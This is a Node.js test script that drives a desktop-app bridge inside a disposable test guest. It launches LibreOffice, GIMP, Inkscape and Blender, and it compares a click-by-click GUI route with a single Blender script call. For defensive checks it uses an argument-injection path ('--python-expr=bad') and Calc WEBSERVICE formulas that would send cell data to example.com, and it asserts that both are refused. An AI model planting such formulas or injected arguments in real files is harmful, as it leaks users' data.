/** Run as root inside a dedicated desktop-image test guest with its X server running. */
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { readFile, writeFile, stat } from "node:fs/promises";
import { randomUUID } from "node:crypto";
import { createDesktopApplications } from "/usr/local/share/openwork-desktop/apps.mjs";

if (process.argv[2] !== "--dedicated-guest") throw new Error("This check operates the desktop. Pass --dedicated-guest only inside a disposable test computer.");
const execute = promisify(execFile);
const display = process.env.DISPLAY ?? ":99";
process.env.DISPLAY = display;
const directory = `/workspace/out/desktop-apps-proof-${randomUUID()}`;
await execute("/usr/sbin/runuser", ["-u", "ubuntu", "--", "sh", "-c", 'umask 077; mkdir "$1"', "_", directory]);
const applications = createDesktopApplications({ directory: `${directory}/logs`, display });
const catalog = await applications.list();
assert.equal(catalog.apps.filter(app => !app.available).length, 0, JSON.stringify(catalog));
await writeFile(`${directory}/catalog.json`, JSON.stringify(catalog, null, 2));
const deadline = AbortSignal.timeout(600_000);
await assert.rejects(applications.launch({ app: "not-an-app" }, deadline), { code: "invalid_app" });
await assert.rejects(applications.launch({ app: "blender", path: "--python-expr=bad" }, deadline), { code: "invalid_path" });

async function window(pattern) {
  for (let n = 0; n < 120; n++) {
    deadline.throwIfAborted();
    const found = await execute("xdotool", ["search", "--onlyvisible", "--class", pattern], { timeout: 3000 }).then(result => result.stdout.trim().split("\n").at(-1), () => undefined);
    if (found) return found;
    await new Promise(resolve => setTimeout(resolve, 250));
  }
  throw new Error(`No visible window for ${pattern}`);
}
const windows = {};
for (const [app, pattern] of [["writer", "libreoffice-writer"], ["gimp", "gimp"], ["inkscape", "inkscape"], ["blender", "blender"]]) {
  await applications.launch({ app }, deadline);
  windows[app] = await window(pattern);
}

// A real GUI save verifies the two users can exchange files, not just list apps.
const note = `${directory}/note.txt`;
await execute("/usr/sbin/runuser", ["-u", "ubuntu", "--", "sh", "-c", 'umask 077; printf "Before editing\\n" > "$1"', "_", note]);
await applications.launch({ app: "editor", path: note }, deadline);
const editor = await window("mousepad");
// A mapped window can precede document loading and other apps' startup focus.
await new Promise(resolve => setTimeout(resolve, 1500));
await execute("xdotool", ["windowactivate", "--sync", editor], { timeout: 3000 });
await new Promise(resolve => setTimeout(resolve, 250));
await execute("xdotool", ["key", "--clearmodifiers", "ctrl+a"], { timeout: 3000 });
await new Promise(resolve => setTimeout(resolve, 100));
await execute("xdotool", ["type", "--clearmodifiers", "--delay", "40", "--", "Saved from the shared desktop"], { timeout: 5000 });
await execute("xdotool", ["key", "--clearmodifiers", "ctrl+s"], { timeout: 3000 });
for (let n = 0; n < 30 && !(await readFile(note, "utf8")).includes("Saved from the shared desktop"); n++) await new Promise(resolve => setTimeout(resolve, 100));
assert.ok((await readFile(note, "utf8")).includes("Saved from the shared desktop"));
await execute("/usr/sbin/runuser", ["-u", "ubuntu", "--", "test", "-r", note]);

// The GUI works without a GPU, and CPU rendering produces an inspectable artifact.
const render = `${directory}/cube.png`;
await execute("/usr/sbin/runuser", ["-u", "openwork-app", "--", "blender", "--background", "--factory-startup", "--threads", "2", "--python-expr", `import bpy; s=bpy.context.scene; s.render.engine='CYCLES'; s.cycles.device='CPU'; s.cycles.use_denoising=False; s.cycles.samples=4; s.render.resolution_x=96; s.render.resolution_y=96; s.render.resolution_percentage=100; s.render.filepath=${JSON.stringify(render)}; bpy.ops.wm.save_as_mainfile(filepath=${JSON.stringify(`${directory}/cube.blend`)}); bpy.ops.render.render(write_still=True)`], { timeout: 120_000, maxBuffer: 1024 * 1024, env: { PATH: "/usr/local/bin:/usr/bin:/bin", HOME: "/home/openwork-app", LIBGL_ALWAYS_SOFTWARE: "1", GALLIUM_DRIVER: "llvmpipe" } });
assert.ok((await stat(render)).size > 100);
await execute("xdotool", ["windowactivate", "--sync", windows.blender]);
await execute("import", ["-window", "root", `${directory}/desktop.png`], { timeout: 5000 });

// Before → after: "add a cube with a red material and render it" in the person's open Blender.
const share = path => execute("/usr/sbin/runuser", ["-u", "ubuntu", "--", "test", "-r", path]);
const redPixels = async path => Number((await execute("python3", ["-c", "import sys; from PIL import Image; print(sum(1 for r, g, b, *_ in Image.open(sys.argv[1]).convert('RGB').getdata() if r > 120 and g < 50 and b < 50))", path])).stdout);
const freshBlender = async () => {
  await execute("pkill", ["-u", "openwork-app", "-x", "blender"]).catch(() => {});
  for (let n = 0; n < 40 && await execute("pgrep", ["-u", "openwork-app", "-x", "blender"]).then(() => true, () => false); n++) await new Promise(resolve => setTimeout(resolve, 250));
  await applications.launch({ app: "blender" }, deadline);
  const id = await window("blender");
  // A launched instance must serve its own bridge before any scene edits are admitted.
  let ready = false;
  for (let n = 0; n < 60 && !ready; n++) {
    try { ready = (await applications.script({ app: "blender", code: "result = 1" }, deadline)).mode === "open session"; }
    catch (error) { if (error.code !== "script_not_ready") throw error; }
    if (!ready) await new Promise(resolve => setTimeout(resolve, 500));
  }
  assert.ok(ready, "The launched Blender instance serves its own bridge");
  await execute("xdotool", ["windowactivate", "--sync", id]);
  return id;
};

// Before: the GUI-only route a computer-use agent takes, replayed with coordinates read from
// screenshots of this image's 1280x800 factory layout. Each act needs a fresh screenshot first.
await freshBlender();
const guiStarted = Date.now();
const before = { acts: 0, inputs: 0, screenshots: 0 };
const observe = async name => { before.screenshots++; await execute("import", ["-window", "root", `${directory}/before-${String(before.screenshots).padStart(2, "0")}-${name}.png`], { timeout: 5000 }); };
const act = async (name, steps, settle = 700) => {
  before.acts++;
  for (const step of steps) {
    if (step.length === 1 && typeof step[0] === "number") { await new Promise(resolve => setTimeout(resolve, step[0])); continue; }
    if (["click", "key", "type"].includes(step[0]) || step.includes("click")) before.inputs++;
    await execute("xdotool", step, { timeout: 5000 });
  }
  await new Promise(resolve => setTimeout(resolve, settle));
  await observe(name);
};
const field = (x, y, text) => [["mousemove", String(x), String(y)], [300], ["click", "--repeat", "2", "--delay", "80", "1"], [300], ["key", "ctrl+a"], ["type", text], ["key", "Return"], [300]];
const output = `${directory}/gui-red-cube.png`;
await observe("start");
await act("add-menu", [["mousemove", "277", "60"], [300], ["click", "1"]]);
await act("mesh-menu", [["mousemove", "306", "85"], [300], ["click", "1"]]);
await act("cube-moved", [["mousemove", "479", "105"], [300], ["click", "1"], [500], ["mousemove", "700", "500"], [300], ["key", "g"], ["key", "x"], ["key", "3"], ["key", "Return"]]);
await act("material-tab", [["mousemove", "1074", "721"], [300], ["click", "1"]]);
await act("new-material", [["mousemove", "1208", "442"], [300], ["click", "1"]], 1200);
await act("color-picker", [["mousemove", "1205", "626"], [300], ["click", "1"]]);
await act("saturation", field(1127, 552, "1"));
await act("render-tab", [["mousemove", "700", "600"], [400], ["mousemove", "1074", "358"], [300], ["click", "1"]]);
await act("samples", [...field(1216, 659, "16"), ["mousemove", "1074", "387"], [300], ["click", "1"]]);
await act("render", [...field(1216, 424, "33"), ["mousemove", "600", "300"], [300], ["key", "F12"]], 8000);
await act("save-dialog", [["mousemove", "600", "330"], [300], ["key", "shift+alt+s"]], 2000);
await act("save-path", [...field(625, 53, `${directory}/`), [500], ...field(565, 634, "gui-red-cube.png"), ["mousemove", "1081", "635"], [300], ["click", "1"]], 2000);
assert.ok(await redPixels(output) > 1000, "The GUI route renders a red cube");
await share(output);
before.seconds = Math.round((Date.now() - guiStarted) / 1000);

// After: one script call edits the same open session, then one screenshot shows the result.
await freshBlender();
const scriptStarted = Date.now();
const after = await applications.script({ app: "blender", render: "final", output: `${directory}/script-red-cube.png`, code: `
bpy.ops.mesh.primitive_cube_add(location=(3, 0, 0))
cube = bpy.context.active_object
red = bpy.data.materials.new("Red")
red.use_nodes = True
red.node_tree.nodes["Principled BSDF"].inputs["Base Color"].default_value = (0.8, 0, 0, 1)
red.diffuse_color = (0.8, 0, 0, 1)
cube.data.materials.append(red)
scene = bpy.context.scene
scene.cycles.samples = 16
scene.render.resolution_percentage = 33
result = cube.name` }, deadline);
await execute("import", ["-window", "root", `${directory}/after-desktop.png`], { timeout: 5000 });
const afterSeconds = Math.round((Date.now() - scriptStarted) / 1000);
assert.equal(after.ok, true, JSON.stringify(after));
assert.equal(after.mode, "open session");
const made = after.scene.objects.find(object => object.name === after.result);
assert.deepEqual(made?.materials, ["Red"]);
assert.deepEqual(after.scene.materials.find(material => material.name === "Red")?.color, [0.8, 0, 0, 1]);
assert.equal(after.scene.unsaved, true, "the script is one undoable, unsaved edit");
assert.ok(await redPixels(after.render.path) > 1000, "The script renders a red cube");
assert.ok(await redPixels(`${directory}/after-desktop.png`) > 1000, "The open Blender window shows the red cube");
await share(after.render.path);

// Stop interrupts a running script; the session keeps working and is not replayed.
const stop = new AbortController();
setTimeout(() => stop.abort(), 1500);
await assert.rejects(applications.script({ app: "blender", code: "import time\nwhile True:\n    time.sleep(0.01)" }, stop.signal), { code: "script_stopped" });
const alive = await applications.script({ app: "blender", code: "result = sum(1 for o in bpy.data.objects if o.name.startswith('Cube'))" }, deadline);
assert.equal(alive.result, 2);

// Office, GIMP and Inkscape lanes: what changed is reported, outputs are shared. The fixture is
// converted with a private profile so it never goes through the open Writer.
const sheet = `${directory}/budget.ods`;
await execute("/usr/sbin/runuser", ["-u", "openwork-app", "--", "sh", "-c", 'cd "$1" && printf "Item,Cost\\n" > budget.csv && soffice -env:UserInstallation=file:///tmp/openwork-proof-office --headless --convert-to ods budget.csv >/dev/null && convert -size 120x80 xc:steelblue photo.png && printf "<svg xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"100\\" height=\\"50\\"><rect width=\\"100\\" height=\\"50\\" fill=\\"red\\"/></svg>" > shape.svg', "_", directory], { timeout: 60_000 });
const written = await applications.script({ app: "calc", operation: "write_range", path: sheet, range: "A2:B3", values: [["Paint", 12.5], ["Total", { formula: "=B2*2" }]] }, deadline);
assert.deepEqual(written.changed.map(change => change.cell), ["A2", "B2", "A3", "B3"]);
assert.equal(written.values[1][1], 25);
// Cell text from pages or files is never evaluated, and formulas cannot send data out.
const pasted = await applications.script({ app: "calc", operation: "write_range", path: sheet, range: "C2", values: [['=WEBSERVICE("https://example.com/?"&A2)']] }, deadline);
assert.equal(pasted.values[0][0], '=WEBSERVICE("https://example.com/?"&A2)');
const fetching = await applications.script({ app: "calc", operation: "write_range", path: sheet, range: "D2:D3", values: [[{ formula: "=1+1" }], [{ formula: '=WEBSERVICE("https://example.com/?"&A2)' }]] }, deadline);
assert.equal(fetching.ok, false);
assert.deepEqual((await applications.script({ app: "calc", operation: "read_range", path: sheet, range: "D2" }, deadline)).values, [[""]], "a refused formula leaves the sheet untouched");
const pdf = await applications.script({ app: "calc", operation: "export_pdf", path: sheet, output: `${directory}/budget.pdf` }, deadline);
assert.ok(pdf.bytes > 1000);
const photo = await applications.script({ app: "gimp", path: `${directory}/photo.png`, output: `${directory}/photo.jpg`, width: 64, rotate: 90 }, deadline);
assert.deepEqual([photo.width, photo.height], [64, 96]);
const shape = await applications.script({ app: "inkscape", path: `${directory}/shape.svg`, output: `${directory}/shape.png`, width: 200, transform: "select-all;object-rotate-90-cw" }, deadline);
assert.deepEqual([shape.width, shape.height], [200, 100]);
await assert.rejects(applications.script({ app: "calc", operation: "read_range", range: "A1", code: "x" }, deadline), { code: "invalid_arguments" });

console.log(JSON.stringify({ directory, installedApps: catalog.apps.length, visibleApps: Object.keys(windows), sharedGuiSave: true, blenderCpuRender: true,
  redCube: { before: { route: "GUI only", ...before, modelTurns: before.screenshots }, after: { route: "computer_app_script", calls: 1, screenshots: 1, modelTurns: 2, seconds: afterSeconds, scriptSeconds: after.seconds } },
  stopCancelsScript: true, office: { changed: written.changedCount, pdfBytes: pdf.bytes }, gimp: [photo.width, photo.height], inkscape: [shape.width, shape.height] }));
